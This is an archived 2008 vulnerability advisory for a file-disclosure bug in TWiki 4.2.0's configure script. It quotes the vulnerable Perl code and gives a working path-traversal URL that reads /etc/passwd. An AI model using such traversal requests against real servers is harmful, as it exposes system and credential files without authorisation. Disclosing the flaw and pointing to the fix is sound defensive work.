<html><head><title>TWiki 4.2.0 (configure) Remote File Disclosure Vulnerability</title></head><pre>################################################################################################################
#                                                                                                              #
#                                 TWiki 4.2.0 File Disclosure Vuln (configure)                                 #
#                                                                                                              #
################################################################################################################

	&quot;We're brazilian newbies!!! :p&quot; - Th1nk3r

Info
----------------------------------------------------------------------------------------------------------------
Classe    :  Input Validation Error 
Remote    :  Yes
Local     :  No
Date      :  05/08/2008
Credits   :  Th1nk3r  (cnwfhguohrugbo / gmail.com)
Greetz    :  w4n73d h4ck3r, Vitor, Vonnatur, FuradordeSyS, B470-Killer, M4v3rick.

Description
----------------------------------------------------------------------------------------------------------------
	TWiki version 4.2.0 (I haven't tested other versions) is vulnerable to a File Disclosure. It's only possible
to exploit the bug if you can access the &quot;/bin/configure&quot; script.
Otherwise, you can not exploit this bug.
	Vulnerable code of &quot;/bin/configure&quot; script:

	if( $action eq 'image' ) {
    		# SMELL: this call is correct, but causes a perl error
    		# on some versions of CGI.pm
    		# print $query-&gt;header(-type =&gt; $query-&gt;param('type'));
    		# So use this instead:
    		print 'Content-type: '.$query-&gt;param('type').&quot;\n\n&quot;;
    	if( open(F, 'logos/'.$query-&gt;param('image' ))) {
        	local $/ = undef;
        	print &lt;F&gt;;
        	close(F);
    	}
    	exit 0;
}

	The bug is in the open() function. The file is set by visitor, and there is no protection added
by the programmer.
	Note that &quot;$query-&gt;param('type')&quot; can be set by the visitor. Therefore, you'll set it to &quot;text/plain&quot;.



Exploit
----------------------------------------------------------------------------------------------------------------

	To exploit the bug, you just need set the &quot;image&quot; variable to the path of file you wish to view. 
	The file will be revealed if you have permission to view it.
	
	By example, to show the &quot;/etc/passwd&quot; file content, go to :
	http://www.examplo.org/{PATH}/bin/configure?action=image;image=../../../../../../etc/passwd;type=text/plain



Solution
----------------------------------------------------------------------------------------------------------------
	Read &quot;http://twiki.org/cgi-bin/view/TWiki/TWikiInstallationGuide&quot;, Basic Installation, topic 8, for 
more information of how to protect your &quot;configure&quot; script.

# milw0rm.com [2008-08-19]</pre></html>